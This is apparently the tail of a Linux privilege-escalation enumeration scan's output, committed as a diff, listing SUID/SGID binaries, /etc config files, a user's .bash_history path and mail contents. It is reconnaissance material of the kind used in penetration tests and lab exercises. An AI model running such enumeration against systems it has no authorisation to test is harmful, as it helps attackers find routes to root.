+-rwsr-xr-x 1 root root 31124 Jul 31  2009 /bin/su
+-rwsr-xr-x 1 root root 9548 Jan 11  2011 /usr/lib/pt_chown
+-r-sr-xr-x 1 root root 9532 Oct 26  2020 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+-r-sr-xr-x 1 root root 14320 Oct 26  2020 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+-rwsr-xr-x 1 root root 5544 Apr 29  2009 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 179120 Oct 22  2009 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 40332 Jul 31  2009 /usr/bin/chfn
+-rwsr-xr-x 1 root root 30936 Jul 31  2009 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 52036 Nov  5  2008 /usr/bin/mtr
+-rwsr-xr-x 1 root root 31756 Jul 31  2009 /usr/bin/chsh
+-rwsr-xr-x 2 root root 123448 Jun 22  2009 /usr/bin/sudo
+-rwsr-xr-x 1 root root 13948 May 12  2009 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 41292 Jul 31  2009 /usr/bin/passwd
+-rwsr-xr-x 1 root root 13816 May 12  2009 /usr/bin/arping
+-rwsr-xr-x 1 root root 57964 Jul 31  2009 /usr/bin/gpasswd
+-rwsr-xr-x 2 root root 123448 Jun 22  2009 /usr/bin/sudoedit
+-rwsr-sr-x 1 daemon daemon 46964 Sep 15  2009 /usr/bin/at
+-rwsr-xr-- 1 root dip 277352 Feb 20  2009 /usr/sbin/pppd
+-rwsr-sr-x 1 libuuid libuuid 13848 Oct 23  2009 /usr/sbin/uuidd
+
+
+[00;31m[-] SGID files:[00m
+-rwxr-sr-x 1 root shadow 30400 Sep  4  2009 /sbin/unix_chkpwd
+-rwxr-sr-x 1 root mlocate 34408 Apr 29  2009 /usr/bin/mlocate
+-rwxr-sr-x 1 root ssh 79912 Oct 22  2009 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root crontab 31712 Sep 15  2009 /usr/bin/crontab
+-rwxr-sr-x 1 root shadow 57580 Jul 31  2009 /usr/bin/chage
+-rwxr-sr-x 3 root mail 9896 Jul  6  2009 /usr/bin/mail-lock
+-rwxr-sr-x 3 root mail 9896 Jul  6  2009 /usr/bin/mail-unlock
+-rwxr-sr-x 1 root tty 13864 Oct 23  2009 /usr/bin/wall
+-rwxr-sr-x 3 root mail 9896 Jul  6  2009 /usr/bin/mail-touchlock
+-rwxr-sr-x 1 root tty 9704 May  9  2009 /usr/bin/bsd-write
+-rwxr-sr-x 1 root mail 14280 Nov 18  2008 /usr/bin/dotlockfile
+-rwxr-sr-x 1 root utmp 361080 Jul  6  2009 /usr/bin/screen
+-rwxr-sr-x 1 root shadow 18128 Jul 31  2009 /usr/bin/expiry
+-rwsr-sr-x 1 daemon daemon 46964 Sep 15  2009 /usr/bin/at
+-rwsr-sr-x 1 libuuid libuuid 13848 Oct 23  2009 /usr/sbin/uuidd
+
+
+[-] Can't search *.conf files as no keyword was entered
+
+[-] Can't search *.php files as no keyword was entered
+
+[-] Can't search *.log files as no keyword was entered
+
+[-] Can't search *.ini files as no keyword was entered
+
+[00;31m[-] All *.conf files in /etc (recursive 1 level):[00m
+-rw-r--r-- 1 root root 34 Mar 17  2017 /etc/ld.so.conf
+-rw-r--r-- 1 root root 1173 Oct 15  2009 /etc/rsyslog.conf
+-rw-r--r-- 1 root root 92 Apr 27  2009 /etc/host.conf
+-rw-r--r-- 1 root root 248 Apr 29  2009 /etc/updatedb.conf
+-rw-r--r-- 1 root root 599 Aug 20  2009 /etc/logrotate.conf
+-rw-r--r-- 1 root root 4794 Oct  6  2009 /etc/hdparm.conf
+-rw-r--r-- 1 root root 2986 Mar 17  2017 /etc/adduser.conf
+-rw-r--r-- 1 root root 350 Mar 17  2017 /etc/popularity-contest.conf
+-rw-r--r-- 1 root root 600 Aug  3  2009 /etc/deluser.conf
+-rw-r--r-- 1 root root 2969 Oct  2  2009 /etc/debconf.conf
+-rw-r--r-- 1 root root 126 Oct  1  2020 /etc/cvs-pserver.conf
+-rw-r--r-- 1 root root 240 Mar 17  2017 /etc/kernel-img.conf
+-rw-r--r-- 1 root root 15752 Jul 25  2009 /etc/ltrace.conf
+-rw-r--r-- 1 root root 85 Oct  1  2020 /etc/resolv.conf
+-rw-r--r-- 1 root root 2277 Sep 16  2009 /etc/sysctl.conf
+-rw-r--r-- 1 root root 89 Oct  1  2020 /etc/cvs-cron.conf
+-rw-r----- 1 root fuse 216 Mar  5  2009 /etc/fuse.conf
+-rw-r--r-- 1 root root 645 May  2  2009 /etc/ts.conf
+-rw-r--r-- 1 root root 6332 Mar 17  2017 /etc/ca-certificates.conf
+-rw-r--r-- 1 root root 1260 May 30  2008 /etc/ucf.conf
+-rw-r--r-- 1 root root 885 Sep  7  2009 /etc/insserv.conf
+-rw-r--r-- 1 root root 801 Oct 24  2009 /etc/mke2fs.conf
+-rw-r--r-- 1 root root 321 Oct 23  2009 /etc/blkid.conf
+-rw-r--r-- 1 root root 552 Sep  4  2009 /etc/pam.conf
+-rw-r--r-- 1 root root 475 Aug 28  2006 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 2689 Mar 27  2008 /etc/gai.conf
+
+
+[00;31m[-] Location and contents (if accessible) of .bash_history file(s):[00m
+/home/george/.bash_history
+
+
+[00;31m[-] Any interesting mail in /var/mail:[00m
+total 8
+drwxrwsr-x  2 root mail 4096 Mar 17  2017 .
+drwxr-xr-x 15 root root 4096 Mar 17  2017 ..
+
+
+[00;33m### SCAN COMPLETE ####################################[00m
